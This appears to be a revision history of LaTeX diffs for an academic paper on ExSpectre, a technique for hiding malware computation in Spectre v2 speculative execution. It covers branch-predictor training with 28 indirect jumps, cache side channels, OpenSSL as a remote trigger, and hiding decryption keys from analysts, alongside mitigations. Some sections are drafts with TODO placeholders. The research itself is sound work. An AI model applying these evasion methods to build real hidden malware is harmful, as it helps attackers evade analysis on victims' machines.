+instructions that are never truly executed. We term the destination where speculation begins
 the \emph{speculative entry point}. \speculake uses indirect jumps to allow
@@
 branches
-using \texttt{jmpq *\%rax} instructions. Between each jump, we increment
-\texttt{\%rax} to account for the number of bytes between jumps. For the last
-jump, we load a function pointer into \texttt{\%rax} and do a final indirect
-branch using \texttt{callq *\%rax}.
+using \texttt{jmpq *\%rax} instructions, as we found that 28 jumps was the minimum
+needed to reliably train the indirect branch predictor. 
+Between each jump, we incremented
+\texttt{\%rax} accordingly to continue on to the next jump. After these 28
+jumps, we load a function pointer into \texttt{\%rax} and do a final indirect
+branch using \texttt{callq *\%rax}. In our trigger, we perform these jumps
+        repeatedly in a loop.
 
 In our payload program, we first perform the same 28 indirect jumps. We ensure
-the source address of these jumps is the same as in the trigger program by
+the source and destination addresses of these jumps is the same as in the trigger program by
 manually defining their containing function at a fixed address inside a linker
 script. We also do the final indirect call to a function pointer, but with two
-differences. First, the destination of the function pointer is a different
-address, and second, the location of the function pointer in memory is uncached.
-This forces the CPU to predict the destination of the indirect call while it
+differences. First, the destination in the function pointer is a different
+address, and second, the memory location of the function pointer itself is uncached.
+This forces the CPU to predict the destination of the final indirect call while it
 waits for the function pointer to load from memory. Due to the similar
@@
 
-Eventually, the dereference of the uncached function pointer in payload program
+Eventually, the dereference of the uncached function pointer in the payload program
 will be resolved, and the CPU will recognize it has incorrectly predicted the
-destination of its \texttt{callq}/\texttt{jmpq}/\texttt{retq} instruction. The
+destination of its \texttt{callq} instruction. The
 results from the speculative entry point instructions will be discarded, and the
-CPU will continue executing from the correct destination. However, as the
-speculative code changes what is loaded into the cache based on its results, it
-can covertly communicate its results to the ``real world'' program.
+CPU will continue executing from the correct destination. However, the
+speculative code can change what is loaded into the cache based on its
+computation, allowing it to covertly communicate its results to the ``real world'' program.
 
@@
 speculatively, as well as what components are responsible for the limit.
-We report results from our experiments on an Intel~Xeon-1270,
+We report results from our experiments on an Intel~Xeon-1270 (Sandy Bridge),
 though we note we found similar results across other Intel processor generations,
-including an i5-7200U, % jack
-an i5-4300U, % ewust laptop
-and an i5-4590. % ewust desktop
+including an i5-7200U (Kaby Lake), % jack
+an i5-4300U (mobile Haswell), % ewust laptop
+an i5-4590 (desktop Haswell), % ewust desktop
+as well as an AMD EPYC 7251. % envy
 % For simplicity, we report results from only the Xeon-1270.
@@
 instruction complexity both have an impact on the number of instructions that
-can be executed. Instruction complexity is determined by the number of $\mu$ ops
+can be executed. Instruction complexity is determined by the number of $\mu$~ops
 that the instruction uses, which appears to be what is tracked in the ROB. For
-instance, on our architecture, the 64-bit \texttt{idiv} instruction takes 59
-$\mu$ ops, and we can execute up to 3 of them in the speculative world.
+instance, on our architecture, the 64-bit \texttt{idiv} instruction takes 59~$\mu$~ops,
+and we can execute up to 3 of them in the speculative world.
 Meanwhile, we can execute up to 18 32-bit \texttt{idiv} instructions, which each
-take 9 $\mu$ ops~\cite{intel-instruction-tables}.
+take 9~$\mu$~ops~\cite{intel-instruction-tables}. These suggest we can execute
+on the order of 175~$\mu$~ops before the speculative world expires.
 
@@
 As shown in Figure~\ref{fig:spec-capacity}, speculative environments can
-complete a significant number of AES rounds---more than enough to decrypt a
-full block using AES-CBC. We investigate the use of AES instructions in the
-spculative environment further in Sections~\ref{subsec:decryption}.
+complete a significant number of AES rounds---over 100 rounds in our
+experiments, more than enough to decrypt a
+full block using simple AES modes (e.g. AES-CTR). We investigate the use of AES
+instructions in the spculative environment further in
+Sections~\ref{subsec:decryption}.
 
@@
 instructions\footnote{While \texttt{nop} is able to execute up to the full 220
-ROB capacity, instructions that do useful work cannot reach this limit}.
+ROB capacity, instructions that do useful work (and/or use multiple $\mu$ ops) cannot reach this limit}.
 
@@
 (which has still not resolved). If the trigger program jumps to C, the payload
-program will speculate a second time and continue speculative execution at C.
+program may speculate a second time and continue speculative execution at C.
 
@@
 limit. We use a 16-deep nested speculation in Section~\ref{subsec:impl-aes}
-to thoroughly protect speculative decryption keys from reverse
+to protect speculative decryption keys from reverse
 engineering.
@@
 
-We summarize our findings into a \emph{speculative primitive}, which allows us to
+We summarize our findings into a \emph{speculative primitive}, which allows our payload program to
 speculatively (and covertly) perform on the order of 100 arbitrary
@@
 writes directly. To update memory, the speculative instructions must communicate
-to the real world through a cache side channel.
+to the real world. We use a cache side channel to do so, but other side channels
+compatible with Spectre could also be used~\cite{spectre1-1}.
 
@@
 out small pieces of information that are aggregated by the real world.
+Meanwhile, smaller channels introduce more overhead in recovering information. We
+investigate this tradeoff in Section~\ref{subsec:impl-aes}, and find that 8~bits
+is near optimal.
 

### 2018-08-02 paper/discussion.tex

@@
 \section{Discussion}
+
+\subsection{Resilience of \speculake}
+%Spectre works to use a cache side-channel to leak information from a process. As
+%such defenses to Spectre work to limit the information available to a
+%speculatively executing program. 
+%
+\subsubsection{Spectre Versions}
+In this work we have implemented applications making use of the speculative
+primitive in Spectre version 2, however the speculative primitive is not 
+unique to this varaint. The \speculake model can be applied more broadly
+across the spectrum of speculative functionality to hide malicious computation.
+
+For example an attacker could construct a series of direct branches with 
+contradictory conditions such that the resulting code section can never 
+be on a real world execution path.
+This, however does not prevent the section from being speculated. An 
+attacker may be able to hide a jump to a speculative entry point in 
+this section and train the branch predictor to take this path.
+
+Alternatively, recent variants of Spectre version 1 could be used to
+redirect control flow in speculative overflow style attacks~\cite{}. 
+Using this technique speculative gadgets could be executed
+based on attacker controlled input.
+
+Similarly we theorize that speculative-store-bypass could be used to
+redirect control flow when the mis-speculated load is that of an indirect
+branch target or function pointer. Again the speculative primitive could 
+be employed to execute speculative gadgets.
+
+These alternatives create an even larger attack area for a potential 
+reverse engineer as the attacker can pivot between them with minimal alterations.
+
+\subsubsection{Gadget Location}
+The benefits of \speculake rely on the computation performed in the
+speculative world being well hidden. To this end we have verified 
+certain requirements about the locations that a speculative gadget can 
+be placed within a binary.
+
+First and foremost the gadget must be in the instruction cache. 
+This does not require that the actual instructions ever run,
+ only that they are in cache. We have 
+found that this is not a large barrier to overcome as Intel 
+processors aggressively prefetch cache pages~\cite{measuring-cache}
+and simple access patterns could be established to ensure
+that the required block(s) are accessible.
+
+We have also confirmed that all speculative code in the payload must be
+stored in executable pages, and that it cannot be stored in non-executable data
+sections. This is somewhat surprising, given the nature of the Meltdown
+vulnerability that enabled speculative execution past page faults. However, in
+the case of Meltdown, the speculative computation still occurs in pages marked
+as executable.
+
+%We suspect that this is again due to caching. The processor has no
+%reason to cache instructions stored in the data section in the instruction
+%cache. If a trigger trains the branch predictor to jump to an address in the
+%payload's data section, the payload will not be able to fetch the instructions
+%into the execution pipeline.
+
+\subsubsection{Hypervisors}
+For virtual environments that provide guests significant periods of access to
+hardware resources, \speculake is viable in certain configurations. 
+This result is specific to Spectre version 2 as it relies on 
+the indirect branch predictor effecting the branches in either the host 
+or guest environment. We have found that the hypercall context switch from 
+guest to host is light enough that a trigger program running in a guest
+can effect the branch predictor in a host on the same CPU core. This is not
+true in the alternate configuration where the trigger runs on the host as the 
+hypercall transition seems to be more substantial. This implies, and we have verified,
+that guest-to-guest indirect branch predictor interference, and the current
+\speculake implementation, will not work across disparate virtual environments.
 
@@
 \speculake. 
+\subsubsection{Implemented Mitigations}
+Multiple mitigation have been implemented in production and consumer environments
+already, stretching from compiler patches to micro-code updates.
+
+IBPB - IBPB is used when transitioning to a new secure address space allowing a
+program to ensure that earlier code's behavior does not effect its branch prediction.
+However, this does not prevent a willing payload program from intentionally omitting
+IBPB protections.
+
+STIBP - As discussed in section~\ref{sssec:hyperthread} Single Thread Indirect Branch Predictors
+prevent sibling threads from interacting via the Indirect Branch Predictor~\cite{}.
+However, this does not prevent coresident processes from cooperating, which is
+guaranteed to eventually occur in most modern operating systems.
+
+IBRS - Prevents code from less privileged prediction modes from effecting predicted
+addresses, specifically used for portecting the kernel. This does not
+prevent speculative execution in a willing payload program in a less privileged
+speculation mode.
+
+Retpoline - Using speculation to prevent speculation, retpoline is a construction
+used to prevent arbitrary indirect jumps that can be included inline by a compiler
+or patched into a binary~\cite{}. While this successfully thwarts indirect branch prediction
+tampering it incurs a siginificant performance penalty when applied globally to all
+indirect branches~\cite{}.
 
@@
 to exfiltrate information from the speculative gadgets, such as the branch
-predictor itself~\cite{evtyushkin2018branchscope}, memory bandwidth, or power
-utilization of the system.
+predictor itself~\cite{evtyushkin2018branchscope}, memory bandwidth, power
+utilization, or contention over other shared resources. While cache 
+channels tend to have the highest throughput, they are not the only 
+resource that must be monitored to detect or prevent these types of attacks.
 
@@
 
-\subsection{Resilience of \speculake}
-%Spectre works to use a cache side-channel to leak information from a process. As
-%such defenses to Spectre work to limit the information available to a
-%speculatively executing program. 
-%
-
-\subsubsection{Gadget Location}
-The benefits of \speculake rely on the computation performed in the
-speculative function being well hidden. To this end we have verified 
-certain requirements about the locations that a speculative gadget can 
-be placed within a binary.
-
-First and foremost the gadget must be in the instruction cache. 
-This does not require that the actual instructions ever run,
- only that they are in cache. We have 
-found that this is not a large barrier to overcome as Intel 
-processors aggressively prefetch cache pages~\cite{measuring-cache}
-and simple access patterns could be established to ensure
-that the required block(s) are accessible.
-
-We have also confirmed that all speculative code in the payload must be
-stored in executable pages, and that it cannot be stored in non-executable data
-sections. This is somewhat surprising, given the nature of the Meltdown
-vulnerability that enabled speculative execution past page faults. However, in
-the case of Meltdown, the speculative computation still occurs in pages marked
-as executable.
-
-%We suspect that this is again due to caching. The processor has no
-%reason to cache instructions stored in the data section in the instruction
-%cache. If a trigger trains the branch predictor to jump to an address in the
-%payload's data section, the payload will not be able to fetch the instructions
-%into the execution pipeline.
-
-\subsubsection{Hypervisors}
-For virtual environments that provide guests significant periods of access to 
-hardware resources, we have found that \speculake is viable in certain configurations.
-
-\texttt{Guest1 -> Guest1}---When both the trigger and payload are run internal to a
-single virtual machine the branch prediction is successfully trained in the
-payload program, though at a notably reduced hit rate. This can be overcome by
-using an increased number of iterations to establish confidence.
-
-\texttt{Guest -> Host}---In a configuration where the trigger runs on the guest
-while the payload runs on the host we have found that \speculake also
-successfully trains the branch predictor well enough retrieve a signal. Again,
-this signal is significantly reduced, implying the hypercall context switch from
-guest to host requires some overhead. We note that processor affinity in a guest
-is not mapped to processor affinity in the host, as the host assigns the VM to
-any available CPU, though eventually the hypervisor will assign the VM back to
-the same core as the payload program allowing progress to continue.
-
-\texttt{Host -> Guest}---When the trigger program executes on the host
-attempting to train the
-branch predictor to influence a payload process in a guest we have found that
-the payload receives no signal. This implies that the hypercall context switch
-from the host to the guest is heavier and has a larger impact on branch history.
-This is also supported by the fact that hypervisors can be fingerprinted from 
-within a VM using the branch predictor as demonstrated by the Project Zero 
-team at Google~\cite{}.
-~\cite{project_zero}.
-
-\texttt{Guest1 -> Guest2}---Configurations where the trigger and payload run on
-co-resident virtual machines similarly show no signal for the same reasons that
-host to guest \speculake fails. However, this has the added difficulty that
-virtual machines must be run on the same core or on a pair of hyperthreaded
-cores.
-
 \subsection{Future Work}

### 2018-08-02 paper/introduction.tex

@@
 store bypass, and using alternative side channels besides the
-cache~\cite{kiriansky2018speculative,spectre3}. In addition, several attacks
+cache~\cite{kiriansky2018speculative, spectre_ng}. In addition, several attacks
 have leveraged Spectre to attack Intel's SGX~\cite{chen2018sgxpectre,

### 2018-08-02 paper/architecture.tex
arch +sentence

@@
 performance advantage for keeping the size of the result small, and communicating
-out small pieces of information that are aggregated by the real world.
+out small pieces of information that are aggregated by the real world over multiple speculative executions.
 Meanwhile, smaller channels introduce more overhead in recovering information. We
 investigate this tradeoff in Section~\ref{subsec:impl-aes}, and find that 8~bits
-is near optimal.
+is near optimal in practice.
 

### 2018-08-02 paper/payloads.tex
first pass on turing and decrypt

@@
 As a first step, we observe that the speculative primitive can be used to trivially
-implement a finite state machine: any logic can be done in the speculative
+implement a finite state machine: logic can be done in the speculative
 world, while updates to the state are communicated to the real world where they
-are stored. On the next run of the speculative instructions, they read from the
-real world state (and other inputs), compute any state transitions, and
-communicate the next state. In this mode, the state is maintained by the real world,
+are stored. On the next run of the speculative instructions, the state is read from the
+real world state (along with any inputs), state transitions are computed and communicated back.
+In this mode, the state is maintained by the real world,
 while updates are controlled by code executed speculatively.
 
-Next, we observe that the instructions to be executed speculatively can be
-obscured further by encrypting them. This encryption allows for hidden
-computation, instructions are stored in the real world encrypted, they are then
-decrypted in the speculative world and passed to the real world to be executed.
-This method makes it appear as though the program is generating its own code.
+We further observe we are not limited to finite state machines, but can support
+any model of computation where \emph{updates} to any state are finite (i.e. can fit
+within the bandwidth constraints of the speculative primitive). This
+encompases Turing machines~\cite{turing1937computable} as well as certain random access machines, which we
+investigate next.
+Figure~\ref{fig:general_model} demonstrates the execution flow of a sample \speculake malware.
+
+%Next, we observe that the instructions to be executed speculatively can be
+%obscured further by encrypting them. This encryption allows for hidden
+%computation, instructions are stored in the real world encrypted, they are then
+%decrypted in the speculative world and passed to the real world to be executed.
+%This method makes it appear as though the program is generating its own code.
 
@@
 \label{subsec:turing}
-To demonstrate that arbitrary computation can be done in the speculative world
-we implement a Turing machine, configured to run the 5-state Busy Beaver 
-function~\cite{chaitin1987computing,herken1992universal}.
-The Busy Beaver is a configuration which writes the most
-1s on the tape before halting with a limited number of states.
+To demonstrate that arbitrary computation can be performed cooperatively between
+the speculative world and real world,
+we implement a Turing machine, and configure it to run a 5-state Busy Beaver 
+function~\cite{turing1937computable,chaitin1987computing,herken1992universal}. This configuration allows
+us to run a large number of steps with very minimal logic.
+%The Busy Beaver is a configuration which writes the most
+%1s on the tape before halting with a limited number of states.
 
-The computation of the Turing Machine is done speculatively, meaning that while
-the real world keeps track of the state, tape, and symbols of the turing machine
-all logic used to update the above is done in the speculative world. Figure~\ref{fig:general_model} demonstrates the execution flow of a sample \speculake malware.
+Updates to this Turing machine are computed speculatively, while the real
+world keeps track of the state and full tape of the machine. Thus, the logic of
+the machine is entirely contained in the speculative world, while the state may
+be externally visible (e.g. to a dynamic debugger). We note that the machine
+only operates when the trigger executes, making it difficult for an analyst with
+only access to the Turing machine to determine exactly what the machine will do
+from its initial state.
+
+However, this toy example is meant only as an illustrative example of arbitrary
+computation, notas a robust means of obfuscation. Indeed, even the initial state
+of a Turing machine alone may reveal a significant amount of information.
+Furthermore, the analyst may attempt to locate potential speculative entry
+points, even without the help of the trigger program. We describe ways to address
+both of these next.
 
@@
 While a Turing machine demonstrates that arbitrary speculative computation
-is possible, hiding malware this way has several drawbacks. First, an
-analyst might be able to observe that something is driving a Turing
-machine by noticing the real world state updating. With enough symbols, the
-analyst could reverse engineer the state machine even without being able to see
-the internal logic executing speculatively. Second, Turing machines are a
-poor choice for practical computation, as they are inefficient and have no direct
-way to perform system calls or otherwise interface externally.
+is possible, hiding malware this way has several drawbacks. First, Turing
+machines are a poor choice for practical computation, as they are inefficient
+and have no direct way to interface with the rest of the system (e.g. via system
+calls). Second, as mentioned, they leave a great deal of information available
+to the analyst, including the initial tape state, and a potentially small
+(enumerable) number of possible speculative entry points.
 
 We explore a more practical application of using \speculake to perform
-decryption speculatively. To hide keys from the analyst, the key and decryption
-code only occur in the speculative world, while committed state only learns the
-resulting plaintext. Furthermore, the speculative code can
-derive the decryption key based entirely off the trigger program, making it
-impossible for an analyst that only has the payload program to
-determine the key or decrypt the embedded ciphertext.
+\emph{decryption} speculatively. To hide keys from the analyst, the key and decryption
+code only occur in the speculative world, while the initial payload program
+contains only the ciphertext. While partial plaintext will be available in the
+real world during execution, we emphasize that this only occurs when the trigger
+runs. Before this, the state of the program reveals only the ciphertext that
+will be decrypted. While the speculative entry point enumeration attack could be
+used to reveal the keys used to decrypt this ciphertext, we describe a way to
+derive the decryption key entirely from the trigger program. Thus, an analyst
+that only has access to the payload program will be unable to learn the key or
+decrypt the embedded ciphertext.
 
-Any observer watching the execution of this program would never see any
-indication of decryption, due to the exploitation of speculative execution. Any
-observation of the executed instructions would not include any decryption
-instructions, or loading of keys as they are only done speculatively, and thus
-not shown in any debugging or real world traces of program execution. 
-%Additionally the observer would be unable to find the executed instructions in
-%the ELF file as they are only stored encrypted.
+We also note that even when the trigger runs, decryption does not occur outside
+the speculative context, meaning that any traditional traps or debugging
+breakpoints placed on decryption instructions or routines will not occur, even
+as they are used speculatively. These instructions could even be obfuscated themselves by
+placing them in other misaligned instructions, and choosing a speculative entry
+point that jumps to the middle of other instructions.
 

### 2018-08-02 paper/architecture.tex

@@
 and a trigger program. Both are installed on the victim's computer (e.g. via
-trojan, remote exploit, or phishing), and must run simultaenously on the same
+trojan, remote exploit, or phishing), and must run simultaneously on the same
 physical CPU. We note that the constraint of running programs on the same CPU is
-not a signifcant burden: \texttt{taskset} can be used to limit a process to a
+not a significant burden: \texttt{taskset} can be used to limit a process to a
 core, or if not available, the attacker can simply run multiple copies of the
 trigger or payload program to coerce the OS scheduler to assign a
-payload/trigger pair to the same core. We note that this is not a strict requirement
-for the attacker as most OS schedulers will use round robin algrithms to assign 
-tasks to processors -- eventually the trigger and payload will execute co-resident
-on a single core.
+payload/trigger pair to the same core. We note that this is not a strict
+requirement for the attacker as most OS schedulers will use round robin
+algorithms to assign tasks to processors---eventually the trigger and payload
+will execute co-resident on a single core.
 

### 2018-08-03 paper/implementation.tex
add triggers section

@@
 \subsection{OpenSSL Trigger}
-\label{subsec:openssl}
+\label{subsec:openssl-impl}
 
-Benign programs can also act as a trigger program, provided they perform sufficient
-indirect jumps to train the branch predictor. We experiment using the OpenSSL
-library as a potential benign trigger, as its source code has gratuitous use of
-function pointers which compile to indirect jumps. In addition, it has many
-complicated code paths that can be easily selected by remote clients by their
-choice of cipher suite.
+%Benign programs can also act as a trigger program, provided they perform sufficient
+%indirect jumps to train the branch predictor. We experiment using the OpenSSL
+%library as a potential benign trigger, as its source code has gratuitous use of
+%function pointers which compile to indirect jumps. In addition, it has many
+%complicated code paths that can be easily selected by remote clients by their
+%choice of cipher suit
 
-For these experiments, we disable ASLR for simplification, but note that
-branch predictors can also be used to determine ASLR offsets and our attack adjusted
-accordingly~\cite{evtyushkin2016jump}.
+To demonstrate a benign trigger application, we implemented an ExSpectre payload that
+would trigger when running concurrently with OpenSSL.
+% Could cut?
+For these experiments, we disable
+ASLR for simplification, but note that
+branch predictors can also be used to determine ASLR offsets of co-resident applications,
+and our attack adjusted accordingly~\cite{evtyushkin2016jump}.
 
@@
 the \texttt{SSL\_new} function. We then made a TLS connection to the
-server\footnote{Which took well over 2~hours, potentially making it the slowest
-TLS handshake to have ever completed},
+server,
 which produced over 13~million instructions, including over 359,000 direct jumps
-and 28,000 indirect jumps. We then searched for the longest repeated set of over
-28-32 indirect jumps that end with a unique jump (i.e. source and destination do
-not occur in the previous 28-32 indirect jumps).
+and 28,000 indirect jumps. We then searched for the longest repeated set of more than
+28 indirect jumps that end with a unique jump (i.e. source and destination do
+not occur in the previous 28+ indirect jumps).
 
@@
 jump pattern in
-our payload program. Our program jumps to the source address of a pair,
-which has a single \texttt{retq} instruction that pops the next
-destination off the stack, performing the indirect jump. At each destination
-address, we place another static (direct) \texttt{jmpq} to bring execution to the
-next source address in our list. The last jump source/destination pair is not
-performed (and its destination is not pushed to the stack). However, we place
-our gadget code at the destination address, which, when executed speculatively,
-loads a specific value into the cache.
-The ``true'' destination of the last indirect jump returns to our
-payload program, which immediately times probing the cache to see if any value was
-loaded.
+our payload program. Our payload program mimicks the first 30 indirect jump
+source/destination pairs, with a final jump going to a cache timing function
+in our payload program. However, due to the prior pattern, this last jump is
+frequently mis-speculated (about 3.5\% of the time), and instead goes to the
+destination corresponding to the 31st jump in OpenSSL, which serves as our
+speculative entry point.
 
-We ran these experiments on an Intel Haswell
+%Our program jumps to the source address of a pair,
+%which has a single \texttt{retq} instruction that pops the next
+%destination off the stack, performing the indirect jump. At each destination
+%address, we place another static (direct) \texttt{jmpq} to bring execution to the
+%next source address in our list. The last jump source/destination pair is not
+%performed (and its destination is not pushed to the stack). However, we place
+%our gadget code at the destination address, which, when executed speculatively,
+%loads a specific value into the cache.
+%The ``true'' destination of the last indirect jump returns to our
+%payload program, which immediately times probing the cache to see if any value was
+%loaded.
+
+We ran experiments on an Intel Haswell
 i5-4590 CPU, with OpenSSL and our payload program pinned to the same core using
@@
 secp256r1 curve (ECDHE-RSA-AES256-GCM-SHA384). When running Apache benchmark locally, our payload program
-reliably achieves a 3.5\% hit rate. When apache benchmark runs on a remote
-machine, the hit rate drops to approximately 2.0\%. Nonetheless, these are both
-sufficient to perform computation, though we must perform a greater number of
-speculative iterations
-to extract results from the speculative world before updating any real world state.
+reliably executes (speculatively) at the intended speculative entry point
+about 3.5\% of the time. When apache benchmark runs on a remote
+machine, this rate drops to approximately 2.0\%. Nonetheless, these are both
+sufficient to perform computation, as our payload can simply increase the amount
+of iterations needed to extract meaningful results from the speculative world.
 
-We verified that our payload program did not observe any cache loads (0\% hit
-rate) when we ran
-other programs that consumed CPU on the same core. In addition, when we used
+We verified that our payload program did not execute at the speculative entry
+point when we ran
+other programs that simply consumed CPU on the same core. In addition, when we used
 Apache benchmark to create thousands of connections with a different cipher
-suite (DHE-RSA-AES128-GCM-SHA256), we similarly received no hit rate. This
-could potentially allow an adversary to use an obscure or uncommon (but still
-supported) cipher suite to trigger a malicious payload program on a remote server.
+suite (DHE-RSA-AES128-GCM-SHA256), we similarly received no speculation. This
+could allow an adversary to use an obscure or uncommon (but still
+supported) cipher suite to trigger a malicious \speculake payload program on a remote server.
 

### 2018-08-03 paper/triggers.tex
add triggers section

@@
-\section{Trigger Programs}
-Easy answer: custom program that mistrains branch predictor
+\section{Triggers}
+%Easy answer: custom program that mistrains branch predictor
 
-\subsection{Benign Triggers}
-Could also be any program on the system, and potentially remote!
+So far, we have described using a custom program as a trigger, which performs a
+pattern of indirect jumps to mistrain the indirect branch predictor. In this
+section, we describe alternative triggers, including using benign programs
+already on the system, and recent Spectre variants.
 
-\subsection{Complex Triggers}
-When considering packers and crypters used in modern malware it is not uncommon to see 
-a malicious sample packed using multiple stages with different unpacking conditions. 
-Whether that be red pills, or environent checks, or network triggers, the reliance is on
-complexity to fool any reverse engineer out of finding the correct conditions to 
-release the full payload.
+\subsection{Benign Program Triggers}
+\label{subsec:openssl}
 
-Similarly \speculake can be instrumented to use more than one trigger. Multiple stages 
-can be designed used any combination of crafted or benign trigger programs. Only when all
-stages have been run to completion in order will the malicious payload be revealed.  
-In conjunction with this each stage cna use a randomized ISA to a common emulator, or 
-they can use differnt emulators all together.
+Custom trigger programs that are installed with malicious payload programs may
+be easy for an analyst to pair up and analyze. As an alternative to trying to
+hide the trigger program from the analyst, ExSpectre can use \emph{benign}
+programs already installed on the system as a trigger.
 
-Alternatively each stage could be used to decrypt the next AES key-schedule to decrypt 
-a subsequent layer. Using this model we can instrument \speculake malware as a crypter 
-with the keys hidden in data or dead code which static and dynamic reverse engineering 
-methods will overlook.
+For example, if a benign application makes a series of indirect jumps---thus training
+the indirect branch predictor---an ExSpectre payload can make similar indirect
+jumps leading up to its speculative entry point. The payload's speculative entry
+point will be determined by the benign application, but may be even more
+difficult for an analyst to discover, as now the ExSpectre trigger could be
+\emph{any} application running concurrently on the system.
+
+\paragraph{OpenSSL}
+We experimented using the OpenSSL library as a potential benign trigger
+application, as its source code has a gratuitous use of function pointers which
+compile to indirect jumps. In addition, it has many complicated code paths that
+can be easily selected by remote clients through their choice of cipher suite.
+This allows a remote attacker to trigger ExSpectre malware on a server running a
+(benign) TLS stack supported by OpenSSL, simply by making a large number of TLS
+connections with a specific cipher suite. We describe our implementation using
+OpenSSL as a trigger in Section~\ref{subsec:openssl-impl}.
+
+\medskip
+
+In addition, an adversary could use a benign application (like OpenSSL) to
+\emph{communicate} information covertly to the malicious payload program. For
+example, with OpenSSL, the attacker could have a pair of cipher uncommon cipher
+suites, and using one results in communicating a 1-bit, while the other
+communicates a 0-bit to the payload. To receive this, the payload would have to
+do indirect jump patterns corresponding to both cipher suites, with the
+corresponding speculative entry points shifting in the appropriate bit. Thus, an
+adversary can communicate remotely (over a network) to the payload program
+indirectly via a benign application.
+
+We observe that communication could also go in the other direction: from
+the payload program back to the remote adversary, also via a benign application
+intermediary. The payload program could influence the performance of the benign
+application, and the adversary could time responses from the benign application
+to receive covert information from the malicious payload.
+
+%Could also be any program on the system, and potentially remote!
+
+\subsection{Speculative Buffer Overflow}
+
+In addition to using separate trigger programs, ExSpectre can also use
+\emph{trigger inputs} to a payload program to initiate its malicious behavior.
+While existing fuzzers and symbolic execution tools can discover traditional
+input triggers, we can leverage other Spectre variants...
+
+TODO: Jack
+
+\subsection{Speculative Store Bypass}
+
+TODO: Jack
+
+%\subsection{Complex Triggers}
+%When considering packers and crypters used in modern malware it is not uncommon to see 
+%a malicious sample packed using multiple stages with different unpacking conditions. 
+%Whether that be red pills, or environent checks, or network triggers, the reliance is on
+%complexity to fool any reverse engineer out of finding the correct conditions to 
+%release the full payload.
+%
+%Similarly \speculake can be instrumented to use more than one trigger. Multiple stages 
+%can be designed used any combination of crafted or benign trigger programs. Only when all
+%stages have been run to completion in order will the malicious payload be revealed.  
+%In conjunction with this each stage cna use a randomized ISA to a common emulator, or 
+%they can use differnt emulators all together. 
+%
+%Alternatively each stage could be used to decrypt the next AES key-schedule to decrypt 
+%a subsequent layer. Using this model we can instrument \speculake malware as a crypter 
+%with the keys hidden in data or dead code which static and dynamic reverse engineering 
+%methods will overlook. 
+%
 

### 2018-08-03 paper/implementation.tex
pass on implementation/payload reording

@@
 \section{Implementation and Evaluation}
-We now discuss the details of our implementations and the information learned
-about speculative execution gained by these experiments. We discuss how we gain
-confidence in information passed back, and how a low number of iterations is
-sufficient to gain a strong confidence in results.
+%We now discuss the details of our implementations and the information learned
+%about speculative execution gained by these experiments. We discuss how we gain
+%confidence in information passed back, and how a low number of iterations is
+%sufficient to gain a strong confidence in results.
 
-For each of these payloads, we used our custom trigger program that performs 28
-indirect jumps, followed by a final indirect jump to a function pointer that
-pointed to a gadget at address 0x430000. In each of our payload programs,
-we performed the same 28 indirect jumps and the final indirect jump with the
-function pointer with two differences: first, the function pointer was cleared
-from the cache (using the \texttt{clflush} instruction), and second, the
-function pointer pointed to a different destination (specifically, to a
-function
-that measured the cache side channel, recording the indexes in the probe array
-that appeared to be in the cache and then flushing all indexes).
-At address 0x430000, we placed the code for our speculative gadget within the 
-payload program, which is never directly called
-(but executes speculatively). We note that this code must be loaded into the
-cache but otherwise need not be accessed directly.
+In this section, we discuss implementation details for our payload and trigger
+programs.
+
+%In each of our payload programs,
+%we performed the same 28 indirect jumps and the final indirect jump with the
+%function pointer with two differences: first, the function pointer was cleared
+%from the cache (using the \texttt{clflush} instruction), and second, the
+%function pointer pointed to a different destination (specifically, to a
+%function
+%that measured the cache side channel, recording the indexes in the probe array
+%that appeared to be in the cache and then flushing all indexes).
+%At address 0x430000, we placed the code for our speculative gadget within the 
+%payload program, which is never directly called
+%(but executes speculatively). We note that this code must be loaded into the
+%cache but otherwise need not be accessed directly.
+%
+
+% Could move to an errata appendix?
+%We randomized the stride length between indexes in
+%this array to avoid the CPU's stride prediction from preemptively loading values
+%in the buffer.
 
@@
 
-We implemented a 2-symbol 5-state Busy Beaver Turing machine logic in a  
-payload application. The gadget implementation reads a global state,
-tape, and position, and determines how the state, tape, and position should be
-updated. It encodes this update into a single byte, and loads from a global
-buffer indexed by that byte, loading it into cache.
-We randomized the stride length between indexes in
-this array to avoid the CPU's stride prediction from preemptively loading values
-in the buffer.
+We designed our Turing machine implementation to work with our custom trigger
+program, with 28 indirect jumps mimicked by the Turing payload program.
+We implemented a 2-symbol 5-state Busy Beaver Turing machine logic at the
+speculative entry point (in 42 x86-64 instructions), returning the state update,
+symbol to write, and tape move direction in a single byte via a cache side
+channel.
 
-Our implementation is able to examine the state and current symbol on the Turing
-tape and make decisions (in the speculative world) based on these values as long
-as they are in cache. If one of these becomes uncached, one of two things will
-happen. First, the speculative gadget may simply fail to report any result back
-to the real world, as the uncached read takes too long to return before the
-speculative world is squashed by the resolution of the function pointer. Second,
-the CPU may \emph{speculate} on the value of the uncached item, which may be
-incorrect. Of course, this does not affect the correctness of normal programs,
-but it does impact the correctness of our speculative code. In particular, the
-speculative gadget will compute using an incorrect value of state or current
-symbol, and ultimately report the wrong update.
+We observed in our implementation that it is important that all values used in
+the speculative world---as well as the code itself---be cached. If these are
+evicted, the speculative code may fail to run, or the CPU may \emph{speculate}
+on the value of the uncached item, which may be incorrect. While this does not
+impact the correctness of normal programs whose incorrect speculations will be
+resolved, our speculative code reports results back to the real world before
+this resolution. In our Turing example, we observed this as incorrect state
+transitions.
 
@@
 
-We implemented the 5 state Busy Beaver configuration which requires over 47
-million steps to complete. In order to have confidence the speculative gadget
-executed with the correct inputs and reported the computed result correctly, we
-repeat the execution a number of times and look for the value that was detected
-as present in the cache most often over all the iterations. We measured the
+%TODO: Ian please fill in these numbers
+Instead, we
+repeat the execution several times and look for the modal value over all
+iterations. We measured the
 error rate of our implementation as a function of how many redundant iterations
-of the same step. Our Turing implementation discovered that 10 repetitions is
-sufficient for the real world to determine the correct value, as the ``hit
-rate'' for any one iteration observing the correct value loaded in cache was
-over 80\%. Additionally we found that the speculative world could correctly
-compute a million instructions with no errors at a rate of 324 instructions per
-second.
+of the same step, and found that 10 redundant iterations resulted in 1 error every
+million Turing steps, with the error rate dropping exponentially as iterations
+increase. We choose TODO(Ian) iterations as a conservative bound (error rate measured
+to be 0), and computed 1 million Turing steps at a rate of TODO(Ian)
+steps per second.
+
+% Was 324 steps per second, but was that at 10 iterations? But we just said
+% 10 wasn't perfect (1 error in a million steps), so it seems confusing to say
+% we computed a million steps without error at 10 iterations.
 
@@
 The speculative world is able to take advantage of the AES-NI instructions to
-decrypt messages. However, the speculative upper-limit of 220 instructions is not
